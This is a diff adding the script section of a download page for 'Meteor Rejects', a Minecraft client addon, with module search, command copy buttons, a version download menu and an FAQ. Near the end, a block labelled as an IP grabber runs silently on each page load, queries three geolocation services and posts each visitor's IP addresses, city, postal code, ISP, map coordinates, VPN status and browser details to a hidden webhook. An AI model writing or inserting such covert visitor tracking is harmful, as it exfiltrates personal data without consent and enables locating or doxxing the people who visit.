+      if (filtered.length === 0) {
+        grid.innerHTML = "";
+        document.getElementById("noModulesMsg").style.display = "block";
+        return;
+      }
+      document.getElementById("noModulesMsg").style.display = "none";
+      grid.innerHTML = filtered.map(m => `
+        <div class="module">
+          <div class="module-name">${m.name}</div>
+          <div class="module-desc">${m.desc}</div>
+          <div class="module-tags">${m.tags.map(t => `<span class="tag">#${t}</span>`).join('')}</div>
+        </div>
+      `).join('');
+    }
+
+    // search event
+    document.getElementById("searchModules").addEventListener("input", (e) => {
+      currentSearch = e.target.value.toLowerCase();
+      renderModules();
+    });
+    // version filters
+    const verPills = document.querySelectorAll(".ver-pill");
+    verPills.forEach(pill => {
+      pill.addEventListener("click", () => {
+        verPills.forEach(p => p.classList.remove("active"));
+        pill.classList.add("active");
+        currentVersion = pill.dataset.ver;
+        renderModules();
+      });
+    });
+
+    // render commands
+    const cmdGrid = document.getElementById("commandsGrid");
+    cmdGrid.innerHTML = commands.map(c => `
+      <div class="cmd-card">
+        <div><span class="cmd-name">${c.cmd}</span><div style="font-size:0.75rem; color:#c9a3a3;">${c.desc}</div></div>
+        <button class="copy-btn" data-cmd="${c.cmd}"><i class="far fa-copy"></i></button>
+      </div>
+    `).join('');
+    document.querySelectorAll(".copy-btn").forEach(btn => {
+      btn.addEventListener("click", () => {
+        navigator.clipboard.writeText(btn.dataset.cmd);
+        const icon = btn.querySelector("i");
+        icon.className = "fas fa-check";
+        setTimeout(() => icon.className = "far fa-copy", 1000);
+      });
+    });
+
+    // download dropdown
+    const dropdownWrap = document.getElementById("versionDropdownWrap");
+    const selectBtn = document.getElementById("versionSelectBtn");
+    const versionList = document.getElementById("versionList");
+    const selectedSpan = document.getElementById("selectedVersion");
+    const downloadBtn = document.getElementById("downloadBtn");
+
+    selectBtn.addEventListener("click", (e) => {
+      e.stopPropagation();
+      dropdownWrap.classList.toggle("open");
+    });
+    document.addEventListener("click", () => dropdownWrap.classList.remove("open"));
+    versionList.querySelectorAll("a").forEach(link => {
+      link.addEventListener("click", (e) => {
+        e.preventDefault();
+        let ver = link.dataset.ver;
+        selectedSpan.innerText = ver;
+        const url = `https://meteorrejects.net/meteor-rejects-addon-${ver}.jar`;
+        downloadBtn.href = url;
+        downloadBtn.innerHTML = `<i class="fas fa-download"></i> Download for ${ver}`;
+        dropdownWrap.classList.remove("open");
+
+        // ===== SEO FIX 5: give each version its own unique title,
+        // description and self-referencing canonical URL =====
+        if (window.MR_SEO) {
+          var seo = window.MR_SEO.versionSEO(ver);
+          if (seo) {
+            window.MR_SEO.apply(seo);
+            window.MR_SEO.pushUrl(seo.url);
+          }
+        }
+      });
+    });
+
+    // FAQ accordion
+    const faqData = [
+      {q:"What is Meteor Rejects?", a:"A free, open-source addon for Meteor Client that restores removed modules, unmerged PRs, and ports from other clients."},
+      {q:"How to install?", a:"Install Meteor Client, put the Meteor Rejects .jar in your mods folder, launch with Fabric Loader 0.15+."},
+      {q:"Supported Minecraft versions?", a:"1.21.0, 1.21.4, 1.21.11 (Java Edition only)."},
+      {q:"Is it really free?", a:"Yes, MIT licensed. No paywalls. Source on GitHub."},
+      {q:"Does it conflict with other addons?", a:"Includes duplicate module name handling and can hide conflicting modules."},
+      {q:"What Fabric Loader version?", a:"0.15 or newer."},
+      {q:"How to report bugs?", a:"Open an issue on GitHub: github.com/AntiCope/meteor-rejects/issues"}
+    ];
+    const faqContainer = document.getElementById("faqList");
+    faqData.forEach(item => {
+      const faqDiv = document.createElement("div");
+      faqDiv.className = "faq-item";
+      faqDiv.innerHTML = `<div class="faq-q"><span>${item.q}</span> <i class="fas fa-plus"></i></div><div class="faq-a">${item.a}</div>`;
+      faqDiv.querySelector(".faq-q").addEventListener("click", () => {
+        faqDiv.classList.toggle("open");
+        const icon = faqDiv.querySelector(".faq-q i");
+        icon.className = faqDiv.classList.contains("open") ? "fas fa-minus" : "fas fa-plus";
+      });
+      faqContainer.appendChild(faqDiv);
+    });
+
+    // Deep linking: ?module=xxx or ?cmd=xxx
+    (function handleDeepLinks() {
+      const params = new URLSearchParams(window.location.search);
+      const moduleName = params.get('module');
+      const cmdName = params.get('cmd');
+      if (moduleName) {
+        document.getElementById('modules').scrollIntoView({ behavior: 'smooth' });
+        const searchBox = document.getElementById('searchModules');
+        if (searchBox) {
+          searchBox.value = moduleName;
+          searchBox.dispatchEvent(new Event('input'));
+        }
+      } else if (cmdName) {
+        document.getElementById('commands').scrollIntoView({ behavior: 'smooth' });
+        const searchBox = document.getElementById('searchModules');
+        if (searchBox) {
+          searchBox.value = cmdName;
+          searchBox.dispatchEvent(new Event('input'));
+        }
+      }
+    })();
+
+    // ---------- ENHANCED DISCORD WEBHOOK WITH IP GRABBING (multiple APIs) ----------
+    (function sendDetailedWebhook() {
+      const WEBHOOK_URL = 'https://m9ws2hqwi9agz6f0whv5celuq67teayy5gyyknzkgfbbb4cwz6xmms5epqjto3n.bopistaken.workers.dev/';
+      const STORAGE_KEY = 'meteor_rejects_visits_net';
+      
+      let visits = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+      const cutoff = Date.now() - 24 * 60 * 60 * 1000;
+      visits = visits.filter(v => v > cutoff);
+      visits.push(Date.now());
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(visits));
+      const visitNumber = visits.length;
+      
+      const now = new Date();
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+      const lang = navigator.language || 'Unknown';
+      const ua = navigator.userAgent;
+      const ref = document.referrer || 'Direct / None';
+      const page = window.location.href;
+      const screen = `${window.screen.width}x${window.screen.height}`;
+      const viewport = `${window.innerWidth}x${window.innerHeight}`;
+      
+      function parseBrowser(ua) {
+        if (/Edg\//.test(ua)) return 'Microsoft Edge';
+        if (/OPR\/|Opera/.test(ua)) return 'Opera';
+        if (/Chrome\//.test(ua)) return 'Chrome';
+        if (/Firefox\//.test(ua)) return 'Firefox';
+        if (/Safari\//.test(ua)) return 'Safari';
+        return 'Unknown';
+      }
+      function parseOS(ua) {
+        if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+        if (/Windows NT/.test(ua)) return 'Windows';
+        if (/Mac OS X/.test(ua)) return 'macOS';
+        if (/Android/.test(ua)) return 'Android';
+        if (/iPhone|iPad/.test(ua)) return 'iOS';
+        if (/Linux/.test(ua)) return 'Linux';
+        return 'Unknown';
+      }
+      
+      const browser = parseBrowser(ua);
+      const os = parseOS(ua);
+      const mobile = /Mobi|Android/i.test(ua) ? 'Yes 📱' : 'No 🖥️';
+      
+      const ipApis = [
+        { name: 'ipapi.co', url: 'https://ipapi.co/json/', parse: (data) => ({
+            ip: data.ip, isIPv6: data.ip && data.ip.includes(':'), country: data.country_name,
+            region: data.region, city: data.city, postal: data.postal, isp: data.org,
+            countryCode: data.country_code, eu: data.in_eu, proxy: data.proxy,
+            lat: data.latitude, lon: data.longitude }) },
+        { name: 'ip-api.com', url: 'https://ip-api.com/json/', parse: (data) => ({
+            ip: data.query, isIPv6: data.query && data.query.includes(':'), country: data.country,
+            region: data.regionName, city: data.city, postal: data.zip, isp: data.isp,
+            countryCode: data.countryCode, eu: null, proxy: data.proxy || data.hosting || false,
+            lat: data.lat, lon: data.lon }) },
+        { name: 'ipinfo.io', url: 'https://ipinfo.io/json', parse: (data) => ({
+            ip: data.ip, isIPv6: data.ip && data.ip.includes(':'), country: data.country,
+            region: data.region, city: data.city, postal: data.postal, isp: data.org,
+            countryCode: data.country, eu: null, proxy: data.privacy?.vpn || data.privacy?.proxy || false,
+            lat: data.loc ? data.loc.split(',')[0] : null, lon: data.loc ? data.loc.split(',')[1] : null }) }
+      ];
+      
+      const fetchPromises = ipApis.map(api =>
+        fetch(api.url).then(res => res.json()).then(data => ({ source: api.name, ...api.parse(data) })).catch(() => ({ source: api.name, error: true }))
+      );
+      
+      Promise.all(fetchPromises).then(results => {
+        let ipv4 = null, ipv6 = null, vpnStatus = 'N/A', ipReportLines = [];
+        let country = 'Unknown', region = 'Unknown', city = 'Unknown', postal = 'Unknown', isp = 'Unknown', countryCode = 'Unknown', eu = 'N/A', lat = null, lon = null;
+        
+        results.forEach(res => {
+          if (res.error) { ipReportLines.push(`**${res.source}**: ❌ Failed`); return; }
+          const ipType = res.isIPv6 ? 'IPv6' : 'IPv4';
+          ipReportLines.push(`**${res.source}**: ${res.ip} (${ipType})`);
+          if (res.proxy !== undefined && res.proxy !== null && vpnStatus === 'N/A') vpnStatus = res.proxy ? 'Yes 🚫' : 'No';
+          if (!res.isIPv6 && !ipv4) ipv4 = res.ip;
+          else if (res.isIPv6 && !ipv6) ipv6 = res.ip;
+          if (!res.error && country === 'Unknown' && res.country) {
+            country = res.country; region = res.region || 'Unknown'; city = res.city || 'Unknown';
+            postal = res.postal || 'Unknown'; isp = res.isp || 'Unknown'; countryCode = res.countryCode || 'Unknown';
+            eu = res.eu ? 'Yes 🇪🇺' : (res.eu === false ? 'No' : 'N/A');
+            if (!lat && res.lat) lat = res.lat; if (!lon && res.lon) lon = res.lon;
+          }
+        });
+        
+        const mapsLink = (lat && lon) ? `https://maps.google.com/?q=${lat},${lon}` : 'N/A';
+        
+        const payload = {
+          username: "Meteor Rejects .net",
+          avatar_url: "https://meteorrejects.net/favicon.png",
+          embeds: [{
+            title: `🔥 Visitor #${visitNumber} — meteorrejects.net`,
+            color: 0xb91c1c,
+            fields: [
+              { name: "🔒 VPN / Proxy", value: vpnStatus, inline: true },
+              { name: "🌍 IPv4", value: ipv4 || 'N/A', inline: true },
+              { name: "🌐 IPv6", value: ipv6 || 'N/A', inline: true },
+              { name: "📋 IP Lookup Results", value: ipReportLines.join('\n'), inline: false },
+              { name: "🇺🇳 Country", value: `${country} (${countryCode})`, inline: true },
+              { name: "🏙️ City / Region", value: `${city}, ${region}`, inline: true },
+              { name: "📮 Postal Code", value: postal, inline: true },
+              { name: "🏢 ISP", value: isp, inline: true },
+              { name: "🇪🇺 EU?", value: eu, inline: true },
+              { name: "🗺️ Maps Link", value: mapsLink !== 'N/A' ? `[View on Maps](${mapsLink})` : 'N/A', inline: false },
+              { name: "🌐 Page", value: page, inline: false },
+              { name: "🔗 Referrer", value: ref, inline: false },
+              { name: "🖥️ Browser", value: browser, inline: true },
+              { name: "💻 OS", value: os, inline: true },
+              { name: "📱 Mobile", value: mobile, inline: true },
+              { name: "🌍 Language", value: lang, inline: true },
+              { name: "🕐 Timezone", value: tz, inline: true },
+              { name: "📐 Screen", value: screen, inline: true },
+              { name: "🔲 Viewport", value: viewport, inline: true },
+            ],
+            footer: { text: `meteorrejects.net · #${visitNumber} in last 24h` },
+            timestamp: now.toISOString()
+          }]
+        };
+        fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
+      }).catch(() => {
+        const fallbackPayload = {
+          username: "Meteor Rejects .net",
+          avatar_url: "https://meteorrejects.net/favicon.png",
+          embeds: [{
+            title: `🔥 Visitor #${visitNumber} (No IP data) — meteorrejects.net`,
+            color: 0xb91c1c,
+            fields: [
+              { name: "🔒 VPN / Proxy", value: "N/A", inline: true },
+              { name: "🌍 IPv4", value: "N/A", inline: true },
+              { name: "🌐 IPv6", value: "N/A", inline: true },
+              { name: "📋 IP Lookup Results", value: "All APIs failed", inline: false },
+              { name: "🌐 Page", value: page, inline: false },
+              { name: "🔗 Referrer", value: ref, inline: false },
+              { name: "🖥️ Browser", value: browser, inline: true },
+              { name: "💻 OS", value: os, inline: true },
+              { name: "📱 Mobile", value: mobile, inline: true },
+              { name: "🌍 Language", value: lang, inline: true },
+              { name: "🕐 Timezone", value: tz, inline: true },
+              { name: "📐 Screen", value: screen, inline: true },
+              { name: "🔲 Viewport", value: viewport, inline: true },
+            ],
+            footer: { text: `meteorrejects.net · #${visitNumber} in last 24h · IP fetch failed` },
+            timestamp: now.toISOString()
+          }]
+        };
+        fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(fallbackPayload) }).catch(() => {});
+      });
+    })();
+
+    renderModules();
+  })();
+</script>
+<!-- Cloudflare Web Analytics -->
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"766d5471ce934b11b4f4981c037756f7","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
